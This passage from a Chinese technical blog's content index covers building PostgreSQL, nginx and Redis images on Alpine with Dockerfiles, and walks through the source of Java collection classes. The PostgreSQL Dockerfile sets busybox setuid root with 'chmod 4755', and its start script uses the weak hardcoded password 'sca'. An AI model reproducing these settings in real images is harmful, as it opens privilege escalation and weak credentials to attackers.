可以看到会新打开一个带有插件的eclipse，可以看到在菜单栏已经有变化，就是插件生效了 接下来我们点击菜单栏的Sample Command，可以看到以下输出 到此，一个简单的eclipse插件就开发完毕了。 参考链接： 引入插件：https://blog.csdn.net/feinifi/article/details/103088082 插件开发：https://www.cnblogs.com/liuzhuo 插件开发：https://blog.csdn.net/feinifi/article/details/106773644","categories":[{"name":"eclipse plugins","slug":"eclipse-plugins","permalink":"http://fireflyingup.github.io/categories/eclipse-plugins/"}],"tags":[{"name":"eclipse","slug":"eclipse","permalink":"http://fireflyingup.github.io/tags/eclipse/"}]},{"title":"dockerfile基于alpine构建postgresql镜像","slug":"dockerfile基于alpine构建postgresql镜像","date":"2022-06-21T15:49:26.000Z","updated":"2023-12-19T01:39:45.548Z","comments":true,"path":"2022/06/21/dockerfile基于alpine构建postgresql镜像/","link":"","permalink":"http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BApostgresql%E9%95%9C%E5%83%8F/","excerpt":"","text":"坏境docker：20.10.10 nginx：1.18.0 podtgres：10.21 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备pgsql的源码包(版本直达)，也可以去pgsql官网处自行下载对应的版本。 准备一个初始化脚本，主要用于创建数据库，用户等等。 准备完之后文件里面内容如下 12345678910╰─$ ls -altotal 50152drwxr-xr-x 8 guoying staff 256 Jun 21 11:42 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1408 Jun 21 22:45 Dockerfile-rw-r--r-- 1 guoying staff 108622 Jun 21 11:38 data.sql-rw-r--r-- 1 guoying staff 640 Jun 21 16:07 start.sh-rw-r--r-- 1 guoying staff 2897 Jun 21 11:38 index.sql-rw-r--r-- 1 guoying staff 128105 Jun 21 11:38 initdb.sql-rw-r--r--@ 1 guoying staff 25419930 Jun 21 09:29 postgresql-10.21.tar.gz 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# build pgsqlFROM alpine:3.16.0ARG user=postgresARG group=postgresWORKDIR /# 将必要文件移入镜像ADD postgresql-10.21.tar.gz /# 创建组和用户 ps：pgsql不允许非root安装RUN addgroup -S $&#123;group&#125; &amp;&amp; adduser \\ --disabled-password \\ --gecos &quot;&quot; \\ --home &quot;/home/postgres&quot; \\ --ingroup &quot;$&#123;group&#125;&quot; \\ --no-create-home \\ # --uid &quot;$UID&quot; \\ &quot;$&#123;user&#125;&quot; &amp;&amp; \\ # 指定apk的aliyun源 echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/repositories &amp;&amp; \\ apk update &amp;&amp; \\ # 安装所需要的环境 apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ readline-dev \\ zlib-dev &amp;&amp; \\ cd /postgresql-10.21 &amp;&amp; \\ # 编译 指定端口8888 ./configure --prefix=/sca/postgresql --with-pgport=8888 &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除缓存和不用的文件 rm -rf /postgresql-10.21 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make &amp;&amp; \\ # 重新安装运行所需要的依赖 apk add readline-dev &amp;&amp; \\ # 创建数据目录，pgsql的data会放在这个目录里面 mkdir /sca/data &amp;&amp; \\ # 赋予权限 chown -R $&#123;user&#125;:$&#123;user&#125; /sca &amp;&amp; \\ chmod 4755 /bin/busybox# 指定postgres用户USER $&#123;user&#125;# 传递初始化sql和脚本到/sca目录下COPY ./initdb.sql /scaCOPY ./data.sql /scaCOPY ./start.sh /sca# 暴露你的端口EXPOSE 8888# 注意这个-w，得要。CMD [ &quot;/sca/postgresql/bin/pg_ctl&quot;, &quot;-D&quot;, &quot;/sca/data&quot;, &quot;-w&quot;, &quot;start&quot; ] start.sh 12345678910111213141516171819202122232425262728293031323334#!/bin/shport=8888data=/sca/databinpath=/sca/postgresql/bin# 判断是否存在posegresql.conf 从而判断是否已经构建完初始化数据库if [ ! -f &quot;$&#123;data&#125;/postgresql.conf&quot; ];then # 调用initdb 构建初始化数据库 echo &quot;initdb begin&quot; $&#123;binpath&#125;/initdb -D $&#123;data&#125; echo 1 &gt; $&#123;data&#125;/.init echo &quot;initdb end&quot; fi# 导入初始化数据if [ -f &quot;$&#123;data&#125;/.init&quot; ];then echo &quot;start data install&quot; $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -w start $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create role sca with superuser login password &#x27;sca&#x27;&quot; -d postgres $&#123;binpath&#125;/createdb -p$&#123;port&#125; --encoding=UTF8 --owner=sca -e sca # $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create extension pgcrypto;&quot; -d sca $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/initdb.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/data.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;alter user sca with nosuperuser&quot; -d postgres rm -rf /sca/dbinit.sh rm -rf /sca/data.sql rm -rf /sca/initdb.sql rm -rf $&#123;data&#125;/.init $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -m fast -w stop echo &quot;end data install&quot;fi# 启动pgsql，这里用pg_ctl会启动不了容器（原因不知，可能和进程有关）exec $&#123;binpath&#125;/postgres -D $&#123;data&#125; 构建镜像docker build -t fire-pgsql:v1.0.0 . 参考创建普通用户（无密码）：https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image","categories":[{"name":"dockerfile","slug":"dockerfile","permalink":"http://fireflyingup.github.io/categories/dockerfile/"}],"tags":[{"name":"postgresql","slug":"postgresql","permalink":"http://fireflyingup.github.io/tags/postgresql/"}]},{"title":"dockerfile基于alpine构建nginx镜像","slug":"dockerfile基于alpine构建nginx镜像","date":"2022-06-21T15:49:18.000Z","updated":"2023-12-19T01:39:50.479Z","comments":true,"path":"2022/06/21/dockerfile基于alpine构建nginx镜像/","link":"","permalink":"http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAnginx%E9%95%9C%E5%83%8F/","excerpt":"","text":"坏境docker：20.10.10 nginx：1.18.0 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备nginx的源码包(版本直达)，也可以去nginx官网处自行下载对应的版本。 准备一个nginx.conf配置文件，里面主要包含了我们对nginx的一些配置，如下其中某些配置需要修改。 1daemon off ; 准备完之后文件里面内容如下 12345678╰─$ ls -altotal 2056drwxr-xr-x 6 guoying staff 192 Jun 22 10:07 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1219 Jun 20 23:25 Dockerfiledrwxr-xr-x 7 guoying staff 224 Jun 20 10:44 dist # 前端文件夹-rw-r--r-- 1 guoying staff 1039530 Apr 21 2020 nginx-1.18.0.tar.gz-rw-r--r-- 1 guoying staff 4820 Jun 20 22:44 nginx.conf #里面需要个daemon off; 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# build nginxFROM alpine:3.16.0WORKDIR /# 将源码包考入的镜像的根目录下ADD nginx-1.18.0.tar.gz /# 配置aliyun仓库RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ # 更新apk apk update &amp;&amp; \\ # 安装必要依赖 apk add --no-cache --virtual .build-deps \\ gcc \\ libc-dev \\ make \\ openssl-dev \\ pcre-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 开始编译nginx cd /nginx-1.18.0 &amp;&amp; \\ ./configure --prefix=/sca/nginx &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除不需要的文件以及缓存 rm -rf nginx-1.18.0.tar.gz &amp;&amp; \\ rm -rf nginx-1.18.0 &amp;&amp; \\ rm -rf /sca/nginx/html &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ # 移除apk的依赖 apk del .build-deps \\ gcc \\ pcre-dev \\ libc-dev \\ make \\ openssl-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 重新安装运行时需要的依赖 apk add pcre-dev# cp html file to containerCOPY ./dist /sca/nginx/htmlCOPY ./nginx.conf /sca/nginx/conf/# 暴露80端口EXPOSE 80# add run command CMD [ &quot;/sca/nginx/sbin/nginx&quot; ] 构建镜像docker build -t fire-nginx:v1.0.0 .","categories":[{"name":"dockerfile","slug":"dockerfile","permalink":"http://fireflyingup.github.io/categories/dockerfile/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://fireflyingup.github.io/tags/nginx/"}]},{"title":"dockerfile基于alpine构建redis镜像","slug":"dockerfile基于alpine构建redis镜像","date":"2022-06-21T15:49:13.000Z","updated":"2023-12-19T01:39:40.299Z","comments":true,"path":"2022/06/21/dockerfile基于alpine构建redis镜像/","link":"","permalink":"http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAredis%E9%95%9C%E5%83%8F/","excerpt":"","text":"前言记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。 坏境docker：20.10.10 redis：5.0.14 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备redis-5.0.14的源码包(5.0.14版本直达)，也可以去所有版本处自行下载对应的版本。 准备一个redis.conf配置文件，里面主要包含了我们对redis的一些配置，如下其中某些配置需要修改。 1daemonize no 准备完之后文件里面内容如下 1234567╰─$ ls -alhtotal 4040drwxr-xr-x 5 guoying staff 160B Jun 21 00:27 .drwxr-xr-x 7 guoying staff 224B Jun 21 22:44 ..-rw-r--r-- 1 guoying staff 901B Jun 21 01:07 Dockerfile-rw-r--r--@ 1 guoying staff 1.9M Jun 20 23:34 redis-5.0.14.tar.gz-rw-r--r-- 1 guoying staff 57K Jun 21 01:13 redis.conf 编写Dockerfile我们先想想整个dockerfile的步骤 1、首先得基于一个很小的系统（alpine） 1FROM alpine:3.16.0 2、准备好需要的文件（redis源码包），可以在镜像里面下载（太慢）也可以自行拷贝进去，这里选择拷贝进去。 1ADD redis-5.0.14.tar.gz / # 将同级目录的redis源码压缩包放入镜像中（压缩包会自行解压） 3、配置apk的源 12RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories 4、安装需要的依赖 12345678910RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ # --no-cache表示不缓存 gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise 5、编译redis，指定编译的地址 12RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install 6、删除编译时候需要运行时候不需要的依赖和多余文件 123456789RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev 7、替换配置文件 并且 暴露端口 12COPY ./redis.conf /sca/redis/EXPOSE 6379 8、准备启动参数 1CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 这样我们整个dockerfile的文件就如下所示 1234567891011121314151617181920212223242526272829303132333435FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 接下来我们执行docker build -t fire-redis:v1.1.0 . ，等若干分钟之后 好家伙345MB，这谁受得了，我们可以使用docker history b3cf3ac45ad1 (这个是IMAGE ID)查看镜像的制造过程 接下来我们准备对镜像进行瘦身，最主要的一个过程就是对RUN 合并，dockerfile文件如下 12345678910111213141516171819202122232425262728293031FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev &amp;&amp; \\ cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise &amp;&amp; \\ cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install &amp;&amp; \\ rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 可以看到大小有很大的缩减 这样子我们就已经制作好了一个redis的镜像，此时使用docker run -d -p 6379:6379 fire-redis:v1.1.1启动容器 常见错误错误1:no such file or directory 12345╰─$ docker build -t fire-nginx:v1.1.0 . 1 ↵[+] Building 0.1s (1/2) =&gt; [internal] load build definition from Dockerfile 0.0s =&gt; =&gt; transferring dockerfile: 2B 0.0sfailed to solve with frontend dockerfile.v0: failed to read dockerfile: open /var/lib/docker/tmp/buildkit-mount956713246/Dockerfile: no such file or directory 解决：Dockerfile写成了DockerFile，注意f小写。 参考https://blog.csdn.net/Struggle99/article/details/124684534","categories":[{"name":"dockerfile","slug":"dockerfile","permalink":"http://fireflyingup.github.io/categories/dockerfile/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://fireflyingup.github.io/tags/redis/"}]},{"title":"Java集合","slug":"集合","date":"2022-04-21T02:40:20.000Z","updated":"2023-12-27T03:31:19.572Z","comments":true,"path":"2022/04/21/集合/","link":"","permalink":"http://fireflyingup.github.io/2022/04/21/%E9%9B%86%E5%90%88/","excerpt":"","text":"Collection ListArrayListArrayList是一个Object数组实现的数据结构，线程不安全 默认初始化大小10 1234/** * Default initial capacity. */private static final int DEFAULT_CAPACITY = 10; add方法 12345678910111213141516171819202122232425262728private void add(E e, Object[] elementData, int s) &#123; if (s == elementData.length) // 当下标的长度等于数组长度时候 扩容 elementData = grow(); // 返回扩容后的数组 elementData[s] = e; size = s + 1;&#125;public boolean add(E e) &#123; // 在父类AbstractList中定义，表示被修改的次数，一般与iterator一起使用， // 当modCount与expectCount不一致时，抛出ConcurrentModificationException异常 modCount++; add(e, elementData, size); return true;&#125;public void add(int index, E element) &#123; rangeCheckForAdd(index); // 判断下标的合法性 index&gt;0 &amp;&amp; index &lt;= size modCount++; final int s; Object[] elementData; if ((s = size) == (elementData = this.elementData).length) elementData = grow(); // 扩容操作 System.arraycopy(elementData, index, elementData, index + 1, s - index); // 使用System.arraycopy分配一个新的数组地址，然后降旧的数据拷贝过来 elementData[index] = element; size = s + 1;&#125; grow方法 123456789101112private Object[] grow(int minCapacity) &#123; int oldCapacity = elementData.length; if (oldCapacity &gt; 0 || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; // 新的数组长度=旧的数组长度+（新增的长度 和 就数组长度的二分之一 中的最大值） int newCapacity = ArraysSupport.newLength(oldCapacity, minCapacity - oldCapacity, /* minimum growth */ oldCapacity &gt;&gt; 1 /* preferred growth */); return elementData = Arrays.copyOf(elementData, newCapacity); &#125; else &#123; return elementData = new Object[Math.max(DEFAULT_CAPACITY, minCapacity)]; &#125; &#125; get方法 1234public E get(int index) &#123; Objects.checkIndex(index, size);//检查下标合法性 return elementData(index); //直接通过下标获取到数据 &#125; ArrayList用数组作为底层数据结构，线程不安全，在新增一个对象的时候，当长度=数组的长度，会进行扩容，将大小扩容到 (当前长度+Math.max(需要新增得长度, 当前长度/2))，扩容的时候，通过Arrays.copyOf()申请一个新的数组地址。当在获取对象的时候直接通过index下标来获取。 性能 查找：通过下标查找，时间复杂度O(1)；通过值查找，时间复杂度O(n)。 顺序插入：直接在最后通过下标获取到数组位置赋值，时间复杂度O(1)，当长度不够时需要扩容。 非顺序插入: 需要将插入位置的数据往后移动。 LinkedListLinkedList底层是采用链表来实现的，也是线程不安全的。 Node类如下 1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; // next节点 Node&lt;E&gt; prev; // prev节点 Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125; &#125; 故得出一个结论 LinkedList是双向链表。 LinkedList插入的基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112/** * Links e as first element. */private void linkFirst(E e) &#123; final Node&lt;E&gt; f = first; final Node&lt;E&gt; newNode = new Node&lt;&gt;(null, e, f); first = newNode; if (f == null) last = newNode; else f.prev = newNode; size++; modCount++;&#125;/** * Links e as last element. */void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125;/** * Inserts element e before non-null Node succ. */void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; final Node&lt;E&gt; pred = succ.prev; final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); succ.prev = newNode; if (pred == null) first = newNode; else pred.next = newNode; size++; modCount++;&#125;/** * Unlinks non-null first node f. */private E unlinkFirst(Node&lt;E&gt; f) &#123; // assert f == first &amp;&amp; f != null; final E element = f.item; final Node&lt;E&gt; next = f.next; f.item = null; f.next = null; // help GC first = next; if (next == null) last = null; else next.prev = null; size--; modCount++; return element;&#125;/** * Unlinks non-null last node l. */private E unlinkLast(Node&lt;E&gt; l) &#123; // assert l == last &amp;&amp; l != null; final E element = l.item; final Node&lt;E&gt; prev = l.prev; l.item = null; l.prev = null; // help GC last = prev; if (prev == null) first = null; else prev.next = null; size--; modCount++; return element;&#125;/** * Unlinks non-null node x. */E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next; final Node&lt;E&gt; prev = x.prev; if (prev == null) &#123; first = next; &#125; else &#123; prev.next = next; x.prev = null; &#125; if (next == null) &#123; last = prev; &#125; else &#123; next.prev = prev; x.next = null; &#125; x.item = null; size--; modCount++; return element;&#125; 查找操作 12345678910111213141516171819public E get(int index) &#123; checkElementIndex(index); return node(index).item; &#125;Node&lt;E&gt; node(int index) &#123; // 当index在前半边，从前往后找，当index在后半边，从后往前找。 if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125; &#125; LinkedList是使用双向链表实现，故不存在扩容的说法。 插入：LinkedList提供了linkFirst、linkLast、linkBefore三种插入操作方便，当顺序插入时时间复杂度为O(1)，直接用linkFirst或者linkLast；当在中间固定位置进行插入时候需要先用node(index)定位到具体位置然后使用linkBefore进行插入，查找的时间复杂度为O(n)。 查找：因为LinkedList的链表实现，当查找第一个或者最后一个的时候，由于LinkedList里面有记录first和last的node，所以时间复杂度为O(1)，查找中间的时候会根据当前index在链表的前半位置（从first向后查找）还是后半位置（从last向前查找）来进行查找，时间复杂度为O(n)。 ArrayList和LinkedList比较 查询比较多：1、查找的是第一个或者最后一个的时候，ArrayList和LinkedList一样都是O(1)；2、查找中间元素的时候，ArrayList时间复杂度O(1)，LinkedList时间复杂度O(n)，选ArrayList。 插入比较多：1、顺序插入，LinkedList时间复杂度O(1)，ArrayList时间复杂度O(1)但是长度不够会进行扩容；2、其他位置插入的时候，LinkedList时间复杂度O(n)，ArrayList会进行数组的copy以及长度不够会进行扩容。 Vectorvector基本是对ArrayList的操作加了synchronized关键字，所以是线程安全的。 CopyOnWriteArrayList123final transient Object lock = new Object(); // 用来作为锁的对象private transient volatile Object[] array; // 真正存数据的地方 首先copyOnWriteArrayList会有一个final修饰的lock对象用来当做锁对象，每次进行set add等操作的时候会使用synchronized对这个lock对象进行加锁，然后copyOnWriteArrayList实现了Cloneable接口，主要为后面的clone做准备。 基本操作方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public E get(int index) &#123; return elementAt(getArray(), index);&#125;public E set(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); E oldValue = elementAt(es, index); if (oldValue != element) &#123; es = es.clone(); es[index] = element; &#125; // Ensure volatile write semantics even when oldvalue == element setArray(es); return oldValue; &#125;&#125;public boolean add(E e) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; es = Arrays.copyOf(es, len + 1); es[len] = e; setArray(es); return true; &#125;&#125;public void add(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; if (index &gt; len || index &lt; 0) throw new IndexOutOfBoundsException(outOfBounds(index, len)); Object[] newElements; int numMoved = len - index; if (numMoved == 0) newElements = Arrays.copyOf(es, len + 1); else &#123; newElements = new Object[len + 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index, newElements, index + 1, numMoved); &#125; newElements[index] = element; setArray(newElements); &#125;&#125;public E remove(int index) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; E oldValue = elementAt(es, index); int numMoved = len - index - 1; Object[] newElements; if (numMoved == 0) newElements = Arrays.copyOf(es, len - 1); else &#123; newElements = new Object[len - 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index + 1, newElements, index, numMoved); &#125; setArray(newElements); return oldValue; &#125;&#125; 可以看到get方法是不加锁的，直接从类定义的array数组里面获取值，而add set remove等方法都需要先进行加锁，然后对原先的array数组clone出来一个新的数组，对新数组进行操作，操作完成后赋值给array对象。 SetHashSet1234private transient HashMap&lt;E,Object&gt; map;// Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); HashSet底层实现使用HashMap，将值存放在HashMap的key里面，value是固定的PRESENT，利用了HashMap的key不重复作用实现了HashSet，所以HashSet是无序、不重复的。 LinkedHashSet代码里面只有四个构造器，调用父类HashSet的构造器，HashSet的实现变成LinkedHashMap，其余操作一致。 TreeSetTreeSet底层使用TreeMap。 QueuePriorityQueue优先级队列，内部采用数组实现平衡二叉堆，n的子节点为2n+1和2(n+1)。 几个重要的参数 1234567891011121314151617181920212223private static final int DEFAULT_INITIAL_CAPACITY = 11; /** * Priority queue represented as a balanced binary heap: the two * children of queue[n] are queue[2*n+1] and queue[2*(n+1)]. The * priority queue is ordered by comparator, or by the elements&#x27; * natural ordering, if comparator is null: For each node n in the * heap and each descendant d of n, n &lt;= d. The element with the * lowest value is in queue[0], assuming the queue is nonempty. */ transient Object[] queue; // non-private to simplify nested class access /** * The number of elements in the priority queue. */ int size; /** * The comparator, or null if priority queue uses elements&#x27; * natural ordering. */ @SuppressWarnings(&quot;serial&quot;) // Conditionally serializable private final Comparator&lt;? super E&gt; comparator; DelayQueue内部实现采用PriorityQueue和ReentrantLock以及Condition。 MapHashMapHashMap的底层采用数组+(链表或者红黑树)来实现，jdk1.7版本和1.8版本还有区别，这里只说1.8版本。 先来一张HashMap数据结构的图 我们先看一下它定义的默认值分别是什么意思。 1234567891011121314151617// 默认的初始化大小为16static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16// 最大的容量大小 1&lt;&lt;30 = 2^30static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;// 默认的扩容因子0.75,达到容量0.75的时候进行扩容static final float DEFAULT_LOAD_FACTOR = 0.75f;// 链表转红黑树的长度static final int TREEIFY_THRESHOLD = 8;// 红黑树转链表的长度static final int UNTREEIFY_THRESHOLD = 6;// 转红黑树的table数组的最小长度static final int MIN_TREEIFY_CAPACITY = 64; HashMap类参数的定义 12345678910// Node的存储地方transient Node&lt;K,V&gt;[] table;// 存储数据的大小transient int size;// 操作的次数transient int modCount;// 需要扩容容量的大小，容量*扩容因子的值。int threshold;// 扩容因子final float loadFactor; Node节点的类参数定义 123456789101112131415161718192021222324252627282930313233343536static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final int hash; final K key; V value; Node&lt;K,V&gt; next; Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final String toString() &#123; return key + &quot;=&quot; + value; &#125; public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value); &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (o == this) return true; return o instanceof Map.Entry&lt;?, ?&gt; e &amp;&amp; Objects.equals(key, e.getKey()) &amp;&amp; Objects.equals(value, e.getValue()); &#125;&#125; 分析一下其中主要的几个重要方法 put方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public V put(K key, V value) &#123; // 获取key的hash值 return putVal(hash(key), key, value, false, true); &#125; /** * Implements Map.put and related methods. * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#x27;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */ final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; // 如果table没初始化 或者 table的长度为0 if ((tab = table) == null || (n = tab.length) == 0) // 执行resize方法初始化table数组 n = (tab = resize()).length; // 如果 数组长度-1 逻辑与 key的hash 作为下标在数组中不存在 if ((p = tab[i = (n - 1) &amp; hash]) == null) // 直接生成新的Node放在table数组里面 tab[i] = newNode(hash, key, value, null); // 说明存在table并且table的对应下标位置有值了 else &#123; Node&lt;K,V&gt; e; K k; // p是table数组的对应下标Node，这里叫pNode // 如果（pNode的hash和key的hash相等）并且（两个的key地址相等 或者两个key equals），直接替换掉pNode。 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // 如果pNode是树（红黑树）节点的话 else if (p instanceof TreeNode) // 直接调用putTreeVal存入 e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); // 说明是链表的形式 else &#123; // 递归pNode的next节点 for (int binCount = 0; ; ++binCount) &#123; // 如果不存在next节点了，说明到低了 if ((e = p.next) == null) &#123; // 直接放在p.next节点 p.next = newNode(hash, key, value, null); // 如果binCount大于等于7（默认） 链表转换为为红黑树 // 实际也就是链表长度大于8的时候 进行转换 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; // 如果（e的hash和key的hash相等）并且（两个的key地址相等 或者 两个key equals），退出当前循环 if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; // 如果存在e if (e != null) &#123; // existing mapping for key // 获取老数据 V oldValue = e.value; // 如果 存在既不插入 或者旧值为空，就赋值 if (!onlyIfAbsent || oldValue == null) e.value = value; // 接口类的方法，LinkedList会实现。 afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; // (长度+1)达到了需要扩容容量的大小的时候 进行resize扩容 if (++size &gt; threshold) resize(); // 接口类的方法，LinkedList会实现。 afterNodeInsertion(evict); return null; &#125; hash方法12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; get方法1234567891011121314151617181920212223242526272829public V get(Object key) &#123; Node&lt;K,V&gt; e; return (e = getNode(key)) == null ? null : e.value; &#125; final Node&lt;K,V&gt; getNode(Object key) &#123; 